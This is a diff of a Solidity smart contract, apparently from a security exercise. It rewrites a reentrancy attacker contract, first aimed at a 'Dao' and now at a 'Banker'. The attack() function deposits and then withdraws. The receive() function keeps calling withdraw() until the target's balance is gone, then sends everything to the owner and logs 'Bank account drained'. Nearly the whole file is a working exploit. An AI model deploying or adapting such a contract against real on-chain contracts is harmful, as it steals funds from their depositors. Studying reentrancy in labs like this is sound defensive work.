@@ -1,34 +1,46 @@
-// SPDX-License-Identifier: MIT
+// // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-interface IDao {
-    function withdraw() external ;
-    function deposit()external  payable;
- }
+import "./Banker.sol";
 
-contract Hacker{
-    IDao dao; 
+interface IBanker {
+    function deposit() external payable;
 
-    constructor(address _dao){
-        dao = IDao(_dao);
+    function withdraw() external;
+}
+
+contract Attacker {
+    IBanker public immutable banker;
+    address private owner;
+
+    constructor(address bankerAddress) {
+        banker = IBanker(bankerAddress);
+        owner = msg.sender;
     }
 
-    function attack() public payable {
-        // Seed the Dao with at least 1 Ether.
-        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
-        dao.deposit{value: msg.value}();
-
-        // Withdraw from Dao.
-        dao.withdraw();
+    modifier onlyOwner() {
+        require(owner == msg.sender, "Attack");
+        _;
     }
 
-    fallback() external payable{
-        if(address(dao).balance >= 1 ether){
-            dao.withdraw();
+    function attack() external payable onlyOwner {
+        banker.deposit{value: msg.value}();
+        banker.withdraw();
+    }
+
+    receive() external payable {
+        if (address(banker).balance > 0) {
+            console.log("attacking again ... ");
+            banker.withdraw();
+        }
+        else {
+            console.log("Bank account drained");
+            console.log("Actual Attacker Balance: ", address(this).balance);
+            payable(owner).transfer(address(this).balance);
         }
     }
 
-    function getBalance()public view returns (uint){
+    function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
